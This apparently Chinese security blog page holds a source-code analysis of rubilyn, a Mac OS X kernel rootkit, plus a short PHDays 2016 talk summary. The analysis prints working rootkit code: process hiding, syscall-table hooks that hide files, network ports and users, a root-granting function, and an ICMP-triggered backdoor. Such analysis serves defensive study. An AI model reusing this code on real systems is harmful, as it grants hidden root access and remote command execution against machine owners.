<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8" />
  
  <title>riusksk&#39;s blog</title>
  <meta name="author" content="riusksk" />

  

  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

  
  <meta property="og:site_name" content="riusksk&#39;s blog" />

  
  

  
    <meta property="og:image" content="undefined" />
  

  
  <link href="/css/images/favicon.ico" rel="icon" />
  

  <link rel="alternate" href="/atom.xml" title="riusksk&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script>
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

	ga('create', 'UA-78773323-1', 'auto');
	ga('send', 'pageview');

</script>



  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>

</head>


<body>
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">riusksk&#39;s blog</a></h1>
  <h2><a href="/">攀蟾折桂摄寰宇，摘星揽月御乾坤。踏云踩雾骋宵壤，驱风逐日闯天地。 ------泉哥</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">主页</a></li>
    
      <li><a href="/archives">归档</a></li>
    
      <li><a href="/atom.xml">RSS订阅</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper">
  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2016-06-05T02:07:52.000Z"><a href="/2016/06/05/osx_rootkit_rubilyn_analyze/">2016-06-05</a></time>
      
      
  
    <h1 class="title"><a href="/2016/06/05/osx_rootkit_rubilyn_analyze/">Mac OSX rootkit rubilyn 源码分析</a></h1>
  

    </header>
    <div class="entry">
      
        <h3 id="1、隐藏进程"><a href="#1、隐藏进程" class="headerlink" title="1、隐藏进程"></a>1、隐藏进程</h3><p>在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc结构的指针，通过allproc链表移除相应进程的proc结构可隐藏正在进行的进程，下面是rubilyn中关于隐藏进程的代码，但目测通过ps -p pid 仍可列出进程，因为它并没有移除进程hash列表pidhashtbl中相关的进程信息，导致可通过pid查找到进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* modify allproc to hide a specific pid */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hideproc</span><span class="params">(<span class="keyword">int</span> pid)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> proc* p;</span><br><span class="line">    <span class="keyword">if</span>(pid!=<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="comment">// lh.first 指向allproc链表中的第1个元素，而p_list.le_next指向下个proc结构</span></span><br><span class="line">        <span class="keyword">for</span> (p = my_allproc-&gt;lh_first; p != <span class="number">0</span>; p = p-&gt;p_list.le_next) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(pid == p-&gt;p_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(hidden_p_count &lt; MAX_HIDDEN_PROCESS)</span><br><span class="line">                &#123;</span><br><span class="line">                    hidden_p[hidden_p_count]=p;</span><br><span class="line">                    hidden_p_count++;   </span><br><span class="line">                    my_proc_list_lock();</span><br><span class="line">                    LIST_REMOVE(p, p_list); 	<span class="comment">// 移除p_list结构中关于p进程的元素</span></span><br><span class="line">                    my_proc_list_unlock();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2、隐藏文件"><a href="#2、隐藏文件" class="headerlink" title="2、隐藏文件"></a>2、隐藏文件</h3><p>为了对列出文件的相应系统函数进行挂钩，我们需要先对finder和ls所使用的函数进行进程跟踪，在mac上已经用Dtrace代替ktrace，在finder上主要是使用getdirentriesattr函数，而ls主要是使用getdirentries64，下面是用Dtrace分别对finder和ls的进程跟踪情况, calltrace.d 脚本内容如下：</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">riusksk<span class="keyword">@macosx</span>:/usr/include/sys$ cat ~/Reverse\ engineering/Dtrace/calltrace.d </span><br><span class="line">pid$target:::entry</span><br><span class="line">&#123;</span><br><span class="line">   ;</span><br><span class="line">&#125;</span><br><span class="line">pid$target:::<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">   printf(<span class="string">"=%d\n"</span>, arg1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是查看finder进程2841的调用函数：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">riusksk@macosx:/usr/include/sys$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -p 2841 | grep getdir</span><br><span class="line">dtrace: script '/Users/riusksk/Reverse engineering/Dtrace/calltrace.d' matched 573227 probes</span><br><span class="line"></span><br><span class="line">  2 1078881          getdirentriesattr:entry </span><br><span class="line">  2 1363229         getdirentriesattr:return =1</span><br></pre></td></tr></table></figure>
<p>下面是ls命令(64位系统)调用的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">riusksk@macosx:~$ sudo dtrace -s ~/Reverse\ engineering/Dtrace/calltrace.d -c ls | grep getdir</span><br><span class="line">dtrace: script &apos;/Users/riusksk/Reverse engineering/Dtrace/calltrace.d&apos; matched 28745 probes</span><br><span class="line">dtrace: pid 3184 has exited</span><br><span class="line">  2 271609          __getdirentries64:entry </span><br><span class="line">  2 285894         __getdirentries64:return =1980</span><br><span class="line">  2 271609          __getdirentries64:entry </span><br><span class="line">  2 285894         __getdirentries64:return =0</span><br></pre></td></tr></table></figure>
<p>因此，我们若想在finder和ls中隐藏文件，只要对这两个函数 getdirentriesattr 和 getdirentries64 （32位的为getdirentries）进行挂钩处理即可。在系统调用函数表中，主要是由sysent结构数组构成，每个sysent结构中都包括参数个数sy_narg，执行函数sy_call 这些重要数据。sysent结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> sysent &#123; <span class="comment">/* system call table */</span></span><br><span class="line">		<span class="keyword">int16_t</span> sy_narg; <span class="comment">/* number of args */</span></span><br><span class="line">		<span class="keyword">int8_t</span> sy_resv; <span class="comment">/* reserved */</span></span><br><span class="line">		<span class="keyword">int8_t</span> sy_flags; <span class="comment">/* flags */</span></span><br><span class="line">		<span class="keyword">sy_call_t</span> *sy_call; <span class="comment">/* implementing function */</span></span><br><span class="line">		<span class="keyword">sy_munge_t</span> *sy_arg_munge32; <span class="comment">/* system call arguments munger for 32-bit process */</span></span><br><span class="line">		<span class="keyword">sy_munge_t</span> *sy_arg_munge64; <span class="comment">/* system call arguments munger for 64-bit process */</span></span><br><span class="line">		<span class="keyword">int32_t</span> sy_return_type; <span class="comment">/* system call return types */</span></span><br><span class="line">		<span class="keyword">uint16_t</span> sy_arg_bytes; <span class="comment">/* Total size of arguments in bytes for* 32-bit system calls */</span></span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
<p>为了实现对上述系统函数的挂钩，通过修改相应函数sysent结构的sy_call来进行偷梁换柱，关于各系统函数的调用号和宏名均可在 /usr/include/sys/syscall.h中找到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">riusksk@macosx:/usr/include/sys$ cat syscall.h | grep getdir</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	SYS_getdirentries  196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	SYS_getdirentriesattr 222</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	SYS_getdirentries64 344</span></span><br></pre></td></tr></table></figure>
<p>下面是rubilyn中对系统调用函数getdirentries64 和 getdirentriesattr的挂钩代码，将这两个函数替换为自定义的 new_getdirentries64  和 new_getdirentriesattr ，同时保存原函数地址方便获取目录信息并进行篡改：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(nsysent)&#123;</span><br><span class="line">    table = find_sysent();</span><br><span class="line">    <span class="keyword">if</span>(table)&#123;</span><br><span class="line">        <span class="comment">/* back up original syscall pointers */</span>    </span><br><span class="line">        org_getdirentries64 = (void *) table[SYS_getdirentries64].sy_call; 	<span class="comment">// 保存原系统函数地址</span></span><br><span class="line">        org_getdirentriesattr = (void *) table[SYS_getdirentriesattr].sy_call; </span><br><span class="line">        <span class="comment">/* replace syscalls in syscall table */</span></span><br><span class="line">        table[SYS_getdirentries64].sy_call = (void *) new_getdirentries64;	<span class="comment">// 替换原系统函数</span></span><br><span class="line">        table[SYS_getdirentriesattr].sy_call = (void *) new_getdirentriesattr;</span><br></pre></td></tr></table></figure>
<p>两个替换函数执行的操作有点类似，主要是移除指定文件的dirent结构，其中dirent结构原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> dirent &#123;</span><br><span class="line">	<span class="keyword">__uint32_t</span> d_fileno; 	<span class="comment">// 节点号</span></span><br><span class="line">	<span class="keyword">__uint16_t</span> d_reclen;	<span class="comment">// 目录项长度</span></span><br><span class="line">	<span class="keyword">__uint8_t</span>  d_type;	<span class="comment">// 文件类型</span></span><br><span class="line">	<span class="keyword">__uint8_t</span>  d_namlen;	<span class="comment">// 文件名</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">if</span> __BSD_VISIBLE</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">define</span> MAXNAMLEN 255</span></span><br><span class="line">	<span class="keyword">char</span> d_name[MAXNAMLEN+<span class="number">1</span>]; <span class="comment">// 文件名</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">char</span> d_name[<span class="number">255</span>+<span class="number">1</span>];	<span class="comment">// 文件名</span></span><br><span class="line">   <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处我们只看下 new_getdirentries64 函数，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hooked getdirentries64 and friends */</span></span><br><span class="line"><span class="keyword">register_t</span> new_getdirentries64(<span class="keyword">struct</span> proc *p, <span class="keyword">struct</span> getdirentries64_args *uap, <span class="keyword">user_ssize_t</span> *retval)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret; </span><br><span class="line">    <span class="keyword">u_int64_t</span> bcount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int64_t</span> btot = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> buffersize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">struct</span> direntry *dirp;</span><br><span class="line">    <span class="keyword">void</span> *mem = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> updated = <span class="number">0</span>;</span><br><span class="line">    ret = org_getdirentries64(p,uap,retval); <span class="comment">// 调用原函数获取目录信息</span></span><br><span class="line">    btot = buffersize = bcount = *retval;    <span class="comment">// 函数返回的字节数</span></span><br><span class="line">    <span class="keyword">if</span>(bcount &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MALLOC(mem,<span class="keyword">void</span> *,bcount,M_TEMP,M_WAITOK);  <span class="comment">// 在内核空间分配bcount大小的内存</span></span><br><span class="line">        <span class="keyword">if</span>(mem == <span class="literal">NULL</span>)</span><br><span class="line">            return(ret); </span><br><span class="line">        copyin(uap-&gt;buf, mem, bcount);  <span class="comment">// 将用户空间数据拷贝到刚分配的内核空间</span></span><br><span class="line">        dirp = mem;</span><br><span class="line">        <span class="keyword">while</span>(bcount &gt; <span class="number">0</span> &amp;&amp; dirp-&gt;d_reclen &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(dirp-&gt;d_reclen &gt; <span class="number">7</span>)</span><br><span class="line">                <span class="comment">// 搜索指定文件名</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">strncmp</span>(dirp-&gt;d_name,(char*)&amp;k_dir,strlen((char*)&amp;k_dir)) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">char</span> *next = (char *) dirp + dirp-&gt;d_reclen;    <span class="comment">// 下一目录项</span></span><br><span class="line">                    <span class="keyword">u_int64_t</span> offset = (char *) next - (char *) mem ;	<span class="comment">// 当前文件目录项大小</span></span><br><span class="line">                    bcount -= dirp-&gt;d_reclen;   <span class="comment">// 递减字节数</span></span><br><span class="line">                    btot -= dirp-&gt;d_reclen;     <span class="comment">// 递减目录项长度</span></span><br><span class="line">                    bcopy(next,dirp,buffersize - offset);   <span class="comment">// 覆盖指定文件的目录项，从而实现文件隐藏</span></span><br><span class="line">                    updated = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            bcount -= dirp-&gt;d_reclen;</span><br><span class="line">            dirp = (struct direntry *) ((char *) dirp + dirp-&gt;d_reclen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(updated == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            copyout(mem,uap-&gt;buf,btot);     <span class="comment">// 将修改后的数据返回给用户空间</span></span><br><span class="line">            *retval = btot; </span><br><span class="line">        &#125;</span><br><span class="line">        FREE(mem,M_TEMP);   <span class="comment">// 释放内核内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3、设置Root进程"><a href="#3、设置Root进程" class="headerlink" title="3、设置Root进程"></a>3、设置Root进程</h3><p>先通过pid获取进程proc结构，然后更改其中进程属主字段p_ucred为0，即root属主。源代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getroot</span><span class="params">(<span class="keyword">int</span> pid)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> proc *rootpid;</span><br><span class="line">    <span class="keyword">kauth_cred_t</span> creds;</span><br><span class="line">    rootpid = proc_find(pid);</span><br><span class="line">    <span class="keyword">if</span>(!rootpid)</span><br><span class="line">        return <span class="number">0</span>;</span><br><span class="line">    lck_mtx_lock((<span class="keyword">lck_mtx_t</span>*)&amp;rootpid-&gt;p_mlock);    <span class="comment">// 设置互斥锁</span></span><br><span class="line">    creds = rootpid-&gt;p_ucred;   <span class="comment">// 进程属主</span></span><br><span class="line">    creds = my_kauth_cred_setuidgid(rootpid-&gt;p_ucred,<span class="number">0</span>,<span class="number">0</span>); <span class="comment">// 设置进程属主id为0(root)</span></span><br><span class="line">    rootpid-&gt;p_ucred = creds;</span><br><span class="line">    lck_mtx_unlock((<span class="keyword">lck_mtx_t</span>*)&amp;rootpid-&gt;p_mlock);  <span class="comment">// 解锁</span></span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4、隐藏网络端口、用户名和内核模块"><a href="#4、隐藏网络端口、用户名和内核模块" class="headerlink" title="4、隐藏网络端口、用户名和内核模块"></a>4、隐藏网络端口、用户名和内核模块</h3><p>通过对write_nocancel函数挂钩，然后对 grep、sysctl、netstat、kextstat、w和who等命令的输出结果进行过滤，当命令输出结果中包含rubilyn模块名以及特写端口和用户名时就直接返回，否则就调用原始的write_nocanel函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hooked write_nocancel for hiding console stuff */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_write_nocancel</span><span class="params">(<span class="keyword">struct</span> proc* p, <span class="keyword">struct</span> write_nocancel_args *uap, user_ssize_t* retval)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[MAXBUFFER];</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(p-&gt;p_comm, grep, strlen(p-&gt;p_comm))==<span class="number">0</span>||<span class="built_in">strncmp</span>(p-&gt;p_comm, sysctl,strlen(p-&gt;p_comm))==<span class="number">0</span>||</span><br><span class="line">       <span class="built_in">strncmp</span>(p-&gt;p_comm, kextstat,strlen(p-&gt;p_comm))==<span class="number">0</span>)&#123;</span><br><span class="line">        bzero(buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        copyin(uap-&gt;cbuf, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(my_strstr(buffer, rubilyn))	</span><br><span class="line">            return(uap-&gt;nbyte);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(p-&gt;p_comm, netstat,strlen(p-&gt;p_comm))==<span class="number">0</span>)&#123;</span><br><span class="line">        bzero(buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        copyin(uap-&gt;cbuf, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(my_strstr(buffer, (char*)&amp;k_port))	</span><br><span class="line">            return(uap-&gt;nbyte);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>((strncmp(p-&gt;p_comm,w,strlen(p-&gt;p_comm))==<span class="number">0</span>||strncmp(p-&gt;p_comm,who,strlen(p-&gt;p_comm))==<span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        bzero(buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        copyin(uap-&gt;cbuf, buffer, <span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(my_strstr(buffer, (char*)&amp;k_user))	</span><br><span class="line">            return(uap-&gt;nbyte);</span><br><span class="line">    &#125;</span><br><span class="line">    return org_write_nocancel(p,uap,retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>5、设置ICMP 后门</p>
<p>首先添加IPv4过滤器ip_filter_ipv4：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* install IPv4 filter hook */</span></span><br><span class="line"> ipf_addv4(&amp;ip_filter_ipv4, &amp;ip_filter_ipv4_ref);</span><br><span class="line"></span><br><span class="line">ip_filter_ipv4结构如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">struct</span> ipf_filter ip_filter_ipv4 = &#123;</span><br><span class="line">	.name		= <span class="string">"rubilyn"</span>,</span><br><span class="line">	.ipf_input	= ipf_input,</span><br><span class="line">	.ipf_output	= ipf_output,</span><br><span class="line">	.ipf_detach	= ipf_detach,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当传给用户的ICMP数据包中包含有以下特定数据时就以root权限执行命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ICMP backdoor configuration */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_TYPE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_CODE 255 <span class="comment">/* xor'd magic word*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_STR <span class="string">"\x27\x10\x3\xb\x46\x8\x1c\x10\x1e"</span>  <span class="comment">// 解密后为“n0mn0mn0m”</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_ICMP_STR_LEN 9</span></span><br></pre></td></tr></table></figure>
<p>ipf_input主要处理传给用户的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> errno_t <span class="title">ipf_input</span><span class="params">(<span class="keyword">void</span>* cookie, mbuf_t *data, <span class="keyword">int</span> offset, u_int8_t protocol)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[IP_BUF_SIZE];</span><br><span class="line">    <span class="keyword">struct</span> icmp *icmp;</span><br><span class="line">    <span class="keyword">if</span> (!(data &amp;&amp; *data))</span><br><span class="line">		return <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (protocol != IPPROTO_ICMP)</span><br><span class="line">		return <span class="number">0</span>;</span><br><span class="line">    mbuf_copydata(*data, offset, IP_BUF_SIZE, buf);</span><br><span class="line">    icmp = (struct icmp *)&amp;buf;</span><br><span class="line">    <span class="comment">// 检测接收的icmp数据包中是否包含后门的特征数据，若是则调用KUNCExecute函数执行命令</span></span><br><span class="line">    <span class="keyword">if</span>(icmp-&gt;icmp_type==MAGIC_ICMP_TYPE&amp;&amp;icmp-&gt;icmp_code== MAGIC_ICMP_CODE &amp;&amp; <span class="built_in">strncmp</span>(icmp-&gt;icmp_data, icmpstr, MAGIC_ICMP_STR_LEN)==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        my_KUNCExecute((char*)&amp;k_cmd, kOpenAppAsRoot, kOpenApplicationPath);</span><br><span class="line">    &#125;</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>rubilyn还有个命令行控制台rubilyncon，通过输入参数选项来执行上面某项功能，主要都是通过sysctl控制内核变量来招待相应函数，这些内核变量都是在rubilyn中用sysctl注册的，通过这些内核变量可从用户层直接与rubilyn内核扩展进行交互来执行恶意操作。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href="/2016/06/05/osx_rootkit_rubilyn_analyze/#comment" class="comment-link">评论</a>
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
  
  <div class="categories">
    <a href="/categories/技术分享/">技术分享</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/OSX/">OSX</a>, <a href="/tags/rootkit/">rootkit</a>
  </div>

        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2016-05-25T02:09:17.000Z"><a href="/2016/05/25/PHDays-2016/">2016-05-25</a></time>
      
      
  
    <h1 class="title"><a href="/2016/05/25/PHDays-2016/">PHDays安全大会议题分析</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="大会简介"><a href="#大会简介" class="headerlink" title="大会简介"></a>大会简介</h2><p>PHDays（Positive Hack Days）,俄罗斯著名的黑客大会，内容涵盖硬件安全、WEB安全、移动安全、网络安全等诸多专业安全领域，并且会议期间设有CTF夺旗竞技赛。</p>
<p>今年会议主要围绕以下主题：关键信息系统的安全性、欺诈管理、网络犯罪和事故调查、维基解密时代的政府与企业安全、网络战和网络间谍。同时，还设有安全论坛，云计算和虚拟基础设施的保护，0day攻防、DDOS防御、工控安全、业务应用和通信网络安全。</p>
<h2 id="议题分析"><a href="#议题分析" class="headerlink" title="议题分析"></a>议题分析</h2><p>关于大会议题的在线视频参见：<a href="http://www.phdays.com/broadcast/" target="_blank" rel="external">http://www.phdays.com/broadcast/</a></p>
<h3 id="1、《Building-Honeypots-to-Monitor-DDoS》"><a href="#1、《Building-Honeypots-to-Monitor-DDoS》" class="headerlink" title="1、《Building Honeypots to Monitor DDoS》"></a>1、《Building Honeypots to Monitor DDoS》</h3><p><img src="/media/14641421571387/14641437211481.jpg" alt=""></p>
<p>作者通过搭建存在DDoS漏洞服务的网络蜜罐，从互联网中提取可视化信息，然后将数据反馈给ELK（Elasticsearch、Logstash、Kibana日志集中分析平台，为保护真实网络财产的系统提供数据支撑。据说，后面作者会开源一个网络管理系统，用于统计外部网络的一些反射DDoS攻击的数据。</p>
<h3 id="2、《Waf-js：How-to-Protect-Web-Applications-using-JavaScript》"><a href="#2、《Waf-js：How-to-Protect-Web-Applications-using-JavaScript》" class="headerlink" title="2、《Waf.js：How to Protect Web Applications using JavaScript》"></a>2、《Waf.js：How to Protect Web Applications using JavaScript》</h3><p><img src="/media/14641421571387/14641534353049.jpg" alt=""><br>使用Javascript代码去防御DOM XSS、CSRF、点击劫持，以及其它攻击环境检测（Beef、Xbackdoor、Acunetix等等）的工具，与Server组使用js防御dom xss的思路类似，只是多了其它几项功能。文档下载：<a href="http://www.slideshare.net/DenisKolegov/wafjs-how-to-protect-web-applications-using-javascript" target="_blank" rel="external">http://www.slideshare.net/DenisKolegov/wafjs-how-to-protect-web-applications-using-javascript</a></p>
